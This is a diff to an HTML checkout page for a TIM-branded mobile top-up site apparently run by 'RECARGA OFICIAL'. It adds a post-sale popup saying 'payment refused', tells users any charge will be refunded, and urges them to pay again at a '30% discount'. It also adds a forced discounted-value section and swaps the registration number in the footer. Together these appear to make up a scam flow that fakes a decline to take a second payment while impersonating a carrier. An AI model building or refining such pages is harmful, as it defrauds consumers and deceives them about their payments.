@@ -275,6 +275,22 @@
           </div>
         </section>
 
+        <!-- Fixed Value with Discount (only when forcing) -->
+        <section id="section-fixed-value" style="display: none;">
+          <h2 class="section-label">Valor da recarga</h2>
+          <div class="fixed-value-card">
+            <div class="fixed-value-original">
+              <span class="fixed-value-strike">R$ 50,00</span>
+              <span class="fixed-value-badge">30% OFF</span>
+            </div>
+            <div class="fixed-value-final">
+              <span class="fixed-value-label">Você paga</span>
+              <span class="fixed-value-amount" id="fixed-value-amount">R$ 35,00</span>
+            </div>
+            <p class="fixed-value-note">Recarga de R$ 50,00 com desconto de 30% por problema anterior no pagamento.</p>
+          </div>
+        </section>
+
         <!-- Order Bump (Shown only for value < 50) -->
         <section id="section-order-bump" style="display: none;">
           <label for="order-bump-checkbox" class="order-bump-card">
@@ -449,52 +465,8 @@
       </div>
     </main>
 
-    <!-- ==================== SCREEN 4: ERRO PÓS-VENDA ==================== -->
-    <main id="screen-erro-venda" class="screen">
-      <header class="header-inner">
-        <button type="button" id="btn-back-to-start-erro" class="btn-back" aria-label="Voltar">
-          <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
-            <path d="m15 18-6-6 6-6"></path>
-          </svg>
-        </button>
-        <div class="tim-brand small">
-          <div class="tim-bars">
-            <span class="tim-bar"></span>
-            <span class="tim-bar"></span>
-            <span class="tim-bar short"></span>
-          </div>
-          <span class="tim-text">TIM</span>
-        </div>
-        <h1>Recarga</h1>
-      </header>
-
-      <div class="error-venda-content">
-        <div class="error-venda-icon-wrap">
-          <svg width="64" height="64" viewBox="0 0 24 24" fill="none" stroke="#FF6B6B" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
-            <circle cx="12" cy="12" r="10"></circle>
-            <line x1="12" y1="8" x2="12" y2="12"></line>
-            <line x1="12" y1="16" x2="12.01" y2="16"></line>
-          </svg>
-        </div>
-        <h1 class="error-venda-title">Pagamento recusado</h1>
-        <p class="error-venda-desc">
-          Seu pagamento foi recusado e não foi concluído. Pedimos desculpas pelo transtorno.
-        </p>
-        <p class="error-venda-desc">
-          Refaça o pagamento e receba <strong>30% de desconto</strong> na próxima recarga.
-        </p>
-        <p class="error-venda-desc small">
-          Caso o pagamento já esteja no seu extrato, não se preocupe — o valor será estornado em questão de minutos.
-        </p>
-        <button type="button" id="btn-refazer-pagamento" class="btn-primary btn-error-venda">
-          Refazer pagamento com 30% de desconto
-        </button>
-      </div>
-    </main>
-
-    <!-- ==================== SCREEN 5: SUCESSO ==================== -->
+    <!-- ==================== SCREEN 4: SUCESSO ==================== -->
     <main id="screen-sucesso" class="screen">
-      <!-- Header with Back Button -->
       <header class="header-inner">
         <button type="button" id="btn-back-to-start" class="btn-back" aria-label="Voltar">
           <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
@@ -519,7 +491,7 @@
             <path d="m9 12 2 2 4-4"></path>
           </svg>
         </div>
-        <h1 class="success-title">Recarga confirmada!</h1>
+        <h1 class="success-title">Recarga aprovada!</h1>
         <p class="success-desc">
           Sua recarga de <strong>R$ <span id="success-total-display">50,00</span></strong> para o número
           <strong><span id="success-phone-display">(11) 99999-9999</span></strong> foi processada com sucesso.
@@ -550,7 +522,7 @@
         <p>RECARGA OFICIAL LTDA - ME</p>
         <p>Nome Fantasia: RECARGA OFICIAL</p>
         <p>CNPJ: 56.428.310/0001-66</p>
-        <p>Inscrição Estadual PE: 1237478-48</p>
+        <p>Inscrição Estadual PE: 0762941-83</p>
       </div>
     </footer>
 
@@ -583,6 +555,33 @@
     </div>
 
   </div>
+
+    <!-- ==================== POPUP PÓS-VENDA ==================== -->
+    <div id="popup-posvenda" class="popup-posvenda" role="dialog" aria-live="polite">
+      <div class="popup-posvenda-overlay"></div>
+      <div class="popup-posvenda-content">
+        <div class="popup-posvenda-icon">
+          <svg width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="#FF6B6B" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <circle cx="12" cy="12" r="10"></circle>
+            <line x1="12" y1="8" x2="12" y2="12"></line>
+            <line x1="12" y1="16" x2="12.01" y2="16"></line>
+          </svg>
+        </div>
+        <h2 class="popup-posvenda-title">Pagamento recusado</h2>
+        <p class="popup-posvenda-desc">
+          Seu pagamento foi recusado e não foi concluído. Pedimos desculpas pelo transtorno.
+        </p>
+        <p class="popup-posvenda-desc">
+          Como pedido de desculpas, você recebe <strong>30% de desconto</strong> na próxima recarga que você fizer.
+        </p>
+        <p class="popup-posvenda-desc small">
+          Caso o pagamento já esteja no seu extrato, não se preocupe — o valor será estornado em questão de minutos.
+        </p>
+        <button type="button" id="btn-popup-refazer" class="popup-posvenda-btn">
+          Refazer pagamento com 30% de desconto
+        </button>
+      </div>
+    </div>
 
   <script src="app.js"></script>
 </body>
